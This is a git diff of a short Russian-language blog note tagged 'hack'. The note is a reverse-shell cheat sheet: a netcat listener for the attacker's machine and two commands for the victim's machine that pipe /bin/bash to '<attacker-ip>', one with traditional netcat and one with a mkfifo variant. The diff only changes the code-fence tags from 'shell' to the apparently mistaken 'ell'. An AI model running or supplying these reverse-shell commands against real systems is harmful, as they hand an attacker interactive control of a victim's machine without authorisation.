@@ -5,15 +5,15 @@ date: 2022-12-09T15:02:00+05:00
 tags: [linux, ssh, hack]
 ---
 ## Машина атакующего
-```shell
+```ell
 nc -lvp <port>
 ```
 ## Машина жертвы (Traditional Netcat)
-```shell
+```ell
 nc <attacker-ip> <port> -e /bin/bash
 ```
 
 ## Машина жертвы (OpenBSD Netcat)
-```shell
+```ell
 mkfifo /tmp/rev; nc <attacker-ip> <port> < /tmp/rev | /bin/bash 2>&1 | tee /tmp/rev > /dev/null
 ```
